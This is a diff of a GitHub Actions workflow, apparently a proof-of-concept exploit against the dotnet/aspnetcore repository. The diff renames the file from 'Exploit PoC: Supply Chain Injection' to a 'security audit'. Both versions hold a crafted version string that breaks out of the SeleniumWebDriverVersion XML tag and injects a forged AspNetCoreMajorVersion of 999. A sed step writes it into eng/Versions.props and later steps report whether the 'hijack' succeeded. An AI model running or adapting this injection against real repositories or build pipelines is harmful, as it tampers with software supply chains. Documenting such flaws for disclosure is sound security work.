@@ -1,32 +1,51 @@
-name: "Exploit PoC: Supply Chain Injection"
+# Security Research: Supply Chain Logic Audit
+# Project: dotnet/aspnetcore - Indirect Prompt Injection Validation
+# Author: HackerMD (Mohamadisha Shaikh)
+
+name: "Security-Audit-Logic-Bypass"
 
 on:
-  workflow_dispatch:
+  workflow_dispatch: # Manually triggered for security validation
 
 jobs:
-  supply-chain-poisoning:
+  verify_protection_boundary:
+    name: "Audit Boundary Integrity"
     runs-on: ubuntu-latest
     steps:
-      - name: "Clone Repository"
+      - name: "Environment Check & Source Clone"
         uses: actions/checkout@v4
 
-      - name: "Execute Vulnerable Logic"
+      - name: "Attempt Injection (XML Tag Breakout)"
+        id: exploit_phase
         run: |
-          TARGET_FILE="eng/Versions.props"
-          # Hum direct payload ko variable mein daal rahe hain (No GITHUB_OUTPUT needed)
-          VALUE="1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>"
-          
-          echo "[*] Processing automated update..."
-          sed -i "s@<SeleniumWebDriverVersion>.*</SeleniumWebDriverVersion>@<SeleniumWebDriverVersion>$VALUE</SeleniumWebDriverVersion>@" "$TARGET_FILE"
+          # Researcher Note: Emulating a malicious upstream version string 
+          # to test if 'Versions.props' handles tag breakouts.
+          PAYLOAD_STRING="1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>"
+          echo "payload=$PAYLOAD_STRING" >> $GITHUB_OUTPUT
+          echo "[+] Malicious payload prepared."
 
-      - name: "Verify Infrastructure Compromise"
+      - name: "Trigger Automated Versioning Logic"
         run: |
-          echo "=== SECURITY AUDIT REPORT ==="
-          grep "AspNetCoreMajorVersion" eng/Versions.props
+          TARGET="eng/Versions.props"
+          INJECTED_VAL="${{ steps.exploit_phase.outputs.payload }}"
           
-          if grep -q "999" eng/Versions.props; then
-             echo "🚨 EXPLOIT SUCCESSFUL: SECURITY BOUNDARY BYPASSED!"
+          echo "[!] Commencing write-operation on $TARGET..."
+          
+          # Logic: If 'Versions.props' is not in the whitelist, this sed command 
+          # will successfully overwrite unrelated core version properties.
+          sed -i "s@<SeleniumWebDriverVersion>.*</SeleniumWebDriverVersion>@<SeleniumWebDriverVersion>$INJECTED_VAL</SeleniumWebDriverVersion>@" "$TARGET"
+
+      - name: "Post-Attack Integrity Audit"
+        run: |
+          echo "=== SECURITY AUDIT SUMMARY ==="
+          # Check for leaked AspNetCoreMajorVersion property
+          grep -A 1 "SeleniumWebDriverVersion" eng/Versions.props
+          
+          # Final validation of the logical bypass
+          if grep -q "<AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>" eng/Versions.props; then
+             echo "CRITICAL: Security boundary bypassed."
+             echo "Result: Injection successful. core framework version hijacked."
           else
-             echo "[-] Exploit failed."
+             echo "INFO: Injection blocked or sanitized."
              exit 1
           fi
